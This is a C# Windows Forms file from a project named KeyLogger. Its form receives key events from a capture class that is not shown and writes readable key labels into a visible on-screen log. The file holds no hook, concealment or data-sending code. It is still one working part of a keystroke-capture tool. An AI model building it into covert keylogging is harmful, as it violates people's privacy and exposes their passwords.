using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class StartForm : Form
    {
        private delegate void SaveKeyDelegate(Keys key);
        private KeyLogger theKeyLogger;

        public StartForm()
        {
            InitializeComponent();
            theKeyLogger = new KeyLogger();
            this.Shown += new EventHandler(StartForm_Shown);
            this.FormClosing += new FormClosingEventHandler(StartForm_FormClosing);
            theKeyLogger.KeyPressed += theKeyLogger_KeyPressed;
        }

        void StartForm_Shown(object sender, EventArgs e)
        {
            theKeyLogger.RunAsync();
        }

        void theKeyLogger_KeyPressed(object sender, Keys key)
        {
            Invoke(new SaveKeyDelegate(this.SaveKeyToLog), key);
        }

        void StartForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            theKeyLogger.Dispose();
        }

        private void btnClear_Click(object sender, EventArgs e)
        {
            txtLog.Clear();
        }

        private void SaveKeyToLog(Keys key)
        {
            string strKey;

            switch (key)
            {
                case Keys.LButton:
                case Keys.MButton:
                case Keys.RButton:
                    return;
                case Keys.Enter:
                    strKey = "/* ENTER KEY */";
                    break;
                case Keys.Back:
                    strKey = "/* BACKSPACE */";
                    break;
                case Keys.Space:
                    strKey = "/* SPACE */";
                    break;
                case Keys.Escape:
                    strKey = "/* ESCAPE */";
                    break;
                case Keys.F1:
                    strKey = "/* F1 */";
                    break;
                case Keys.F2:
                    strKey = "/* F2 */";
                    break;
                case Keys.F3:
                    strKey = "/* F3 */";
                    break;
                case Keys.F4:
                    strKey = "/* F4 */";
                    break;
                case Keys.F5:
                    strKey = "/* F5 */";
                    break;
                case Keys.F6:
                    strKey = "/* F6 */";
                    break;
                case Keys.F7:
                    strKey = "/* F7 */";
                    break;
                case Keys.F8:
                    strKey = "/* F8 */";
                    break;
                case Keys.F9:
                    strKey = "/* F9 */";
                    break;
                case Keys.F10:
                    strKey = "/* F10 */";
                    break;
                case Keys.F11:
                    strKey = "/* F11 */";
                    break;
                case Keys.F12:
                    strKey = "/* F12 */";
                    break;
                case Keys.D0:
                    strKey = "/* D0 */";
                    break;
                case Keys.D1:
                    strKey = "/* D1 */";
                    break;
                case Keys.D2:
                    strKey = "/* D2 */";
                    break;
                case Keys.D3:
                    strKey = "/* D3 */";
                    break;
                case Keys.D4:
                    strKey = "/* D4 */";
                    break;
                case Keys.D5:
                    strKey = "/* D5 */";
                    break;
                case Keys.D6:
                    strKey = "/* D6 */";
                    break;
                case Keys.D7:
                    strKey = "/* D7 */";
                    break;
                case Keys.D8:
                    strKey = "/* D8 */";
                    break;
                case Keys.D9:
                    strKey = "/* D9 */";
                    break;
                case Keys.Tab:
                    strKey = "/* TAB */";
                    break;
                case Keys.CapsLock:
                    strKey = "/* Caps Lock */";
                    break;
                case Keys.ShiftKey:
                    strKey = "";
                    break;
                case Keys.LShiftKey:
                    strKey = "/* Left Shift */";
                    break;
                case Keys.RShiftKey:
                    strKey = "/* Right Shift */";
                    break;
                case Keys.ControlKey:
                    strKey = "";
                    break;
                case Keys.LControlKey:
                    strKey = "/* Left Ctrl */";
                    break;
                case Keys.RControlKey:
                    strKey = "/* Right Ctrl */";
                    break;
                case Keys.Menu:
                    strKey = "";
                    break;
                case Keys.LMenu:
                    strKey = "/* Left Alt */";
                    break;
                case Keys.RMenu:
                    strKey = "/* Right Alt */";
                    break;
                case Keys.Right:
                    strKey = "/* Right Arrow */";
                    break;
                case Keys.Down:
                    strKey = "/* Down Arrow */";
                    break;
                case Keys.Left:
                    strKey = "/* Left Arrow */";
                    break;
                case Keys.Up:
                    strKey = "/* Up Arrow */";
                    break;
                default:
                    strKey = key.ToString();
                    break;
            }

            txtLog.Text += strKey;
        }
    }
}
